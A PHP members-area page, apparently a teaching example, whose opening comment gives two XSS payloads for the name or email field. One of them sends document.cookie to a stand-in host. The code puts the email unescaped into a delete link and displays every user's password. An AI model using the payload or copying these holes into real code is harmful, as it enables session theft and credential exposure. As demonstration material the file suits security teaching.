<?php
/*
This page is vulnerable to a cross-side scripting attack

try typing the following into the name or email field:

1. <script>location.href='http://bbc.co.uk'</script>

2. <script>myLoc = 'http://madeupuni.ac.uk?' + document.cookie; location.href=myLoc</script>
*/ ?>
<?php
session_start();
require_once "../pdo.php";
require '../project_header.php';
title_bar("Members area");

if (!isset($_SESSION['authorised']) || $_SESSION['authorised'] !== true) {

    header('Location: login_form.php');
    exit;
}
$stmt = $pdo->query("SELECT name, email, password FROM users");
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<html>

<head>
    <link rel="stylesheet" href="../css/style.css">
</head>

<body>

    <div class="container">
        <table border="1">
            <tr>
                <th>Name</th>
                <th>Email</th>
                <th>Password</th>
                <th>Options</th>
            </tr>
            <?php
            foreach ($rows as $row) {
                echo "<tr><td>";
                echo (htmlentities($row['name']));
                echo ("</td><td>");
                echo (htmlentities($row['email']));
                echo ("</td><td>");
                echo (htmlentities($row['password']));
                echo ("<td>");
                echo '<a href="deleteuser.php?deleteid=' . $row['email'] . '">Delete user</a>';
                echo ("</td></tr>");
            }
            ?>
        </table>
    </div>

    <section class="page-redirect-buttons">
        <form method="POST" action="addmember.php">
            <button type="submit" class="confirm-buttons">Add new user</button>
        </form>
        <form method="POST" action="stock.php">
            <button type="submit" class="confirm-buttons">Items page</button>
        </form>
        <form method="POST" action="logout.php">
            <button type="submit" class="confirm-buttons">Logout</button>
        </form>
        
    </section>
</body>

</html>